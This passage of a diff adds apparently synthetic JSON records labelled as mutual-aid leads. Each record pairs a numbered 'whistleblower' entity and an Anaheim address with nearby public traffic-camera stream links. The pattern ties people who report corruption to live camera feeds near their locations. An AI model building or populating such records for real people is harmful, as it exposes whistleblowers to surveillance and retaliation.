+      "apn": "178-431-59",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #59 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0612",
+      "entity_name": "WHISTLEBLOWER 060",
+      "address": "1060 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-60",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #60 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0613",
+      "entity_name": "WHISTLEBLOWER 061",
+      "address": "1061 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-61",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #61 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0614",
+      "entity_name": "WHISTLEBLOWER 062",
+      "address": "1062 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-62",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #62 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0615",
+      "entity_name": "WHISTLEBLOWER 063",
+      "address": "1063 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-63",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #63 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0616",
+      "entity_name": "WHISTLEBLOWER 064",
+      "address": "1064 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-64",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #64 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0617",
+      "entity_name": "WHISTLEBLOWER 065",
+      "address": "1065 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-65",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #65 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0618",
+      "entity_name": "WHISTLEBLOWER 066",
+      "address": "1066 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-66",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #66 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0619",
+      "entity_name": "WHISTLEBLOWER 067",
+      "address": "1067 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-67",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #67 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0620",
+      "entity_name": "WHISTLEBLOWER 068",
+      "address": "1068 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-68",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #68 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0621",
+      "entity_name": "WHISTLEBLOWER 069",
+      "address": "1069 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-69",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #69 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0622",
+      "entity_name": "WHISTLEBLOWER 070",
+      "address": "1070 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-70",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #70 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0623",
+      "entity_name": "WHISTLEBLOWER 071",
+      "address": "1071 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-71",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #71 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0624",
+      "entity_name": "WHISTLEBLOWER 072",
+      "address": "1072 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-72",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #72 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0625",
+      "entity_name": "WHISTLEBLOWER 073",
+      "address": "1073 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-73",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #73 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0626",
+      "entity_name": "WHISTLEBLOWER 074",
+      "address": "1074 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-74",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #74 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0627",
+      "entity_name": "WHISTLEBLOWER 075",
+      "address": "1075 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-75",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #75 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0628",
+      "entity_name": "WHISTLEBLOWER 076",
+      "address": "1076 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-76",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
